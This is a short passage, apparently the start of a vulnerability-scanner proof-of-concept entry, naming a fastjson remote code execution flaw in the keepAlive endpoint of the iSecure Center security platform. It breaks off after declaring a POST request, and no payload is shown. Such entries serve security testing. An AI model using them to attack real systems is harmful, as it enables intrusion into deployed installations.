{
        'name': '综合安防管理平台 iSecure Center keepAlive fastjson 远程代码执行漏洞',
        'poc':[{'requests':{
            'method': 'post',
